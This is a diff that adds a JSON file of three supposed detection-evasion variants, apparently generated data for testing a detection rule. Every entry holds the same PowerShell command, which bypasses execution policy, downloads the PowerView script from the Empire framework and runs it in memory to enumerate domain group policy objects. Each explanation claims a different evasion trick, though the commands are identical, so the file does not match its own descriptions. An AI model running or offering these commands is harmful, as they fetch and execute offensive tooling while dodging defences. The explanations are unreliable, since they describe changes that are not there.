@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+    "explanation": "Omission: Removed the explicit path to the executable, relying on PowerShell's in-memory execution to bypass the 'Image' field match."
+  },
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+    "explanation": "Insertion: Added quotes and spaces around the command-line arguments to alter parsing without changing the behavior, potentially evading string-based detection."
+  },
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+    "explanation": "Substitution: Replaced the explicit path with a download and in-memory execution, which avoids the 'Image' field match by not invoking an external executable."
+  }
+]
